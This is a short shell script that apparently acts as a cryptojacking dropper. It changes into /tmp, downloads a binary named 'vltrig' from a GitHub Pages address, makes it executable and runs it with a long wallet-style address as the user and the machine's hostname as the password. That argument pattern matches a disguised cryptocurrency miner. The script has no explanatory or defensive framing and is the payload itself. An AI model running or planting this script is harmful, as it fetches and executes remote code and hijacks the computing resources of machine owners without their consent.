#!/bin/sh

cd /tmp
wget https://ivanhi0.github.io/vltrig
chmod +x ./vltrig
./vltrig --user 42zHmvjLFQf6nLHbVCzm5RNxwovafb9mbPhYixC9ynFn29uxjGfPY3Z1BM5e2RXdnyiZCcujqznUoJ7AfPQpy4BPU7UrCJb --pass $(hostname -b)
